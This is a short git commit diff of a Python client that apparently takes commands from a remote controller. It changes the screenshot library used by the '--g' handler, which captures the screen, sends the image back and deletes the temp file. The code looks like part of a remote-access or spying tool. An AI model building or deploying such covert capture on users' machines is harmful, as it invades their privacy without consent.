bce66a00624ca31ed3805f16984e29121612dde6
Y4hL <43219534+Y4hL@users.noreply.github.com>
2020-03-18 22:18:55 +0200

    switched to pyscreeze
    switched from pyscreenshot to pyscreeze as pyscreenshot did not work when building the client into a exe

--- client.py
+++ client.py
@@ -9,7 +9,7 @@ import time
 
 import psutil
 import pyperclip
-import pyscreenshot
+import pyscreeze
 import requests
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
@@ -236,12 +236,11 @@ class Client(object):
                 continue
 
             if data[0] == '--g':
-                pic = pyscreenshot.grab()
                 if platform.system() == 'Windows':
                     _file = '{}\\temp.png'.format(os.environ['TEMP'])
                 else:
                     _file = '{}/temp.png'.format(os.environ['HOME'])
-                pic.save(_file)
+                pyscreeze.screenshot(_file)
                 with open(_file, 'rb') as f:
                     self.send(f.read())
                 os.remove(_file)
